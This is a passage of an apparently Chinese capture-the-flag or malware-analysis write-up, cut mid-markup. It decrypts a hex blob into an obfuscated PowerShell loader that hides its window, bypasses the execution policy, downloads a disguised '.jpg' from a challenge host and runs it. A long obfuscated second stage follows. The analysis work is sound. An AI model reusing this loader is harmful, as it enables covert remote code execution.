class="string">&quot;a5a9b49fb8adbeb8e19cbea3afa9bfbfeceee8a9a2baf69fb5bfb8a9a19ea3a3b8909fb5bf9b839bfaf8909ba5a2a8a3bbbf9ca3bba9be9fa4a9a0a090bafde2fc90bca3bba9bebfa4a9a0a0e2a9b4a9eeece19ba5a2a8a3bb9fb8b5a0a9ec84a5a8a8a9a2ece18dbeabb9a1a9a2b880a5bfb8ecebe1bbebe0eba4ebe0ebe1a9bcebe0eb99a2bea9bfb8bea5afb8a9a8ebe0ebe18fa3a1a1ada2a8ebe0ee9fa9b8e19aadbea5adaea0a9ecffeceba4b8b8bcf6e3e3afa4ada0a0a9a2aba9e2b4a5a2bfa4a5e2aab9a2f6f8faf4f5f9e3aea9bfb8b9a8a8a5a2abe2a6bcabebf79f85ec9aadbea5adaea0a9f6e396f888eceb82a9b8e29ba9ae8fa0a5a9a2b8ebf7afa8f79f9aecaff884ece4e2ace889b4a9afb9b8a5a3a28fa3a2b8a9b4b8e285a2baa3a7a98fa3a1a1ada2a8e2e4e4ace889b4a9afb9b8a5a3a28fa3a2b8a9b4b8e285a2baa3a7a98fa3a1a1ada2a8b08ba9b8e181a9a1aea9bee597fe91e282ada1a9e5e285a2baa3a7a9e4ace889b4a9afb9b8a5a3a28fa3a2b8a9b4b8e285a2baa3a7a98fa3a1a1ada2a8e2e4e4ace889b4a9afb9b8a5a3a28fa3a2b8a9b4b8e285a2baa3a7a98fa3a1a1ada2a8b08ba9b8e181a9a1aea9beb09ba4a9bea9b7e48b9aec93e5e29aada0b9a9e282ada1a9e1afa0a5a7a9ebe6a882ada1a9ebb1e5e282ada1a9e5e285a2baa3a7a9e4eb82a9e6afb8ebe0fde0fde5e5e4809fec9aadbea5adaea0a9f6e396f888e5e29aada0b9a9e5f79f9aec8dece4e4e4e48ba9b8e19aadbea5adaea0a9ecaff884ece19aada0b9a983e5b08ba9b8e181a9a1aea9bee5b09ba4a9bea9b7e48b9aec93e5e29aada0b9a9e282ada1a9e1afa0a5a7a9ebe6bba2e6a8e6abebb1e5e282ada1a9e5f7eae4979fafbea5bcb88ea0a3afa791f6f68fbea9adb8a9e4e48ba9b8e19aadbea5adaea0a9ecaff884ece19aada0b9a983e5e2e4e48ba9b8e19aadbea5adaea0a9ec8de5e29aada0b9a9e5e285a2baa3a7a9e4e49aadbea5adaea0a9ecffece19aada0e5e5e5e5eef7&quot;</span></span><br><span class="line">decrypted = decrypt_powershell_script(hex_string)</span><br><span class="line"><span class="built_in">print</span>(decrypted)</span><br></pre></td></tr></table></figure><p>解出来的是</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">iex</span><span class="built_in">Start-Process</span> <span class="string">&quot;<span class="variable">$env:SystemRoot</span>\SysWOW64\WindowsPowerShell\v1.0\powershell.exe&quot;</span> <span class="literal">-WindowStyle</span> <span class="keyword">Hidden</span> <span class="literal">-ArgumentList</span> <span class="string">&#x27;-w&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;-ep&#x27;</span>,<span class="string">&#x27;Unrestricted&#x27;</span>,<span class="string">&#x27;-Command&#x27;</span>,<span class="string">&quot;Set-Variable 3 &#x27;http://challenge.xinshi.fun:46895/bestudding.jpg&#x27;;SI Variable:/Z4D &#x27;Net.WebClient&#x27;;cd;SV c4H (.`$ExecutionContext.InvokeCommand.((`$ExecutionContext.InvokeCommand|Get-Member)[2].Name).Invoke(`$ExecutionContext.InvokeCommand.((`$ExecutionContext.InvokeCommand|Get-Member|Where&#123;(GV _).Value.Name-clike&#x27;*dName&#x27;&#125;).Name).Invoke(&#x27;Ne*ct&#x27;,1,1))(LS Variable:/Z4D).Value);SV A ((((Get-Variable c4H -ValueO)|Get-Member)|Where&#123;(GV _).Value.Name-clike&#x27;*wn*d*g&#x27;&#125;).Name);&amp;([ScriptBlock]::Create((Get-Variable c4H -ValueO).((Get-Variable A).Value).Invoke((Variable 3 -Val))))&quot;</span>;</span><br></pre></td></tr></table></figure><p>意思是把<a href="http://challenge.xinshi.fun:46895/bestudding.jpg%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E4%B8%8B%E6%9D%A5%E5%B9%B6%E6%89%A7%E8%A1%8C">http://challenge.xinshi.fun:46895/bestudding.jpg文件下载下来并执行</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">&#x27;(&#x27;</span>  | % &#123; <span class="variable">$r</span> = + <span class="variable">$</span>() &#125; &#123; <span class="variable">$u</span> = <span class="variable">$r</span> &#125; &#123; <span class="variable">$b</span> = ++  <span class="variable">$r</span> &#125; &#123; <span class="variable">$q</span> = (  <span class="variable">$r</span> = <span class="variable">$r</span> + <span class="variable">$b</span>  ) &#125; &#123; <span class="variable">$z</span> = (  <span class="variable">$r</span> = <span class="variable">$r</span> + <span class="variable">$b</span>  ) &#125; &#123; <span class="variable">$o</span> = (<span class="variable">$r</span> = <span class="variable">$r</span> + <span class="variable">$b</span>  ) &#125; &#123; <span class="variable">$d</span> = (<span class="variable">$r</span> = <span class="variable">$r</span> + <span class="variable">$b</span>  ) &#125; &#123; <span class="variable">$h</span> = (<span class="variable">$r</span> = <span class="variable">$r</span> + <span class="variable">$b</span>  ) &#125; &#123; <span class="variable">$e</span> = (<span class="variable">$r</span> = <span class="variable">$r</span> + <span class="variable">$b</span>  ) &#125; &#123; <span class="variable">$i</span> = (<span class="variable">$r</span> = <span class="variable">$r</span> + <span class="variable">$b</span>  ) &#125; &#123; <span class="variable">$x</span> = (<span class="variable">$q</span> *( <span class="variable">$z</span>) ) &#125; &#123; <span class="variable">$l</span> = (<span class="variable">$r</span> = <span class="variable">$r</span> + <span class="variable">$b</span>) &#125; &#123; <span class="variable">$g</span> = <span class="string">&quot;[&quot;</span> + <span class="string">&quot;<span class="variable">$</span>(@&#123;  &#125;)&quot;</span>[<span class="variable">$e</span>  ] + <span class="string">&quot;<span class="variable">$</span>(@&#123;  &#125;)&quot;</span>[  <span class="string">&quot;<span class="variable">$b</span><span class="variable">$l</span>&quot;</span>  ] + <span class="string">&quot;<span class="variable">$</span>(@&#123;  &#125;  )  &quot;</span>[  <span class="string">&quot;<span class="variable">$q</span><span class="variable">$u</span>&quot;</span>  ] + <span class="string">&quot;<span class="variable">$</span>?&quot;</span>[<span class="variable">$b</span>  ] + <span class="string">&quot;]&quot;</span> &#125; &#123; <span class="variable">$r</span> = <span class="string">&quot;&quot;</span>.(<span class="string">&quot;<span class="variable">$</span>(  @&#123;&#125;  )  &quot;</span>[  <span class="string">&quot;<span class="variable">$b</span><span class="variable">$o</span>&quot;</span>  ] + <span class="string">&quot;<span class="variable">$</span>(@&#123;&#125;)  &quot;</span>[  <span class="string">&quot;<span class="variable">$b</span><span class="variable">$h</span>&quot;</span>] + <span class="string">&quot;<span class="variable">$</span>(  @&#123;  &#125;  )&quot;</span>[<span class="variable">$u</span>] + <span class="string">&quot;<span class="variable">$</span>(@&#123;&#125;  )&quot;</span>[<span class="variable">$o</span>] + <span class="string">&quot;<span class="variable">$</span>?  &quot;</span>[  <span class="variable">$b</span>] + <span class="string">&quot;<span class="variable">$</span>(  @&#123;&#125;)&quot;</span>[<span class="variable">$z</span>  ]) &#125; &#123; <span class="variable">$r</span> = <span class="string">&quot;<span class="variable">$</span>(@&#123;  &#125;  )&quot;</span>[  <span class="string">&quot;<span class="variable">$b</span>&quot;</span> + <span class="string">&quot;<span class="variable">$o</span>&quot;</span>] + <span class="string">&quot;<span class="variable">$</span>(@&#123;  &#125;)  &quot;</span>[<span class="variable">$o</span>  ] + <span class="string">&quot;<span class="variable">$r</span>&quot;</span>[<span class="string">&quot;<span class="variable">$q</span>&quot;</span> + <span class="string">&quot;<span class="variable">$e</span>&quot;</span>  ] &#125;  )  ;  <span class="string">&quot; <span class="variable">$r</span>  (<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$q</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$q</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$q</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$d</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$d</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$q</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$q</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$q</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$d</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$d</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$q</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$o</span><span 